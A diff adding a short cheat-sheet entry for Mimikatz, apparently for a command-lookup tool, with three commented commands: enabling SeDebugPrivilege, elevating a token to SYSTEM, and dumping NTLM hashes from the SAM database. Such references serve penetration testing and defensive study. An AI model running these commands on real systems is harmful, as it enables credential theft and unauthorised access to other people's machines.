@@ -1,0 +1,14 @@
+% mimikatz
+
+# enable SeDebugPrivilege
+privilege::debug
+
+# elevate permissions to system
+token::elevate
+
+# extract NTLM hashes from SAM
+lsadump::sam
+
+
+
+
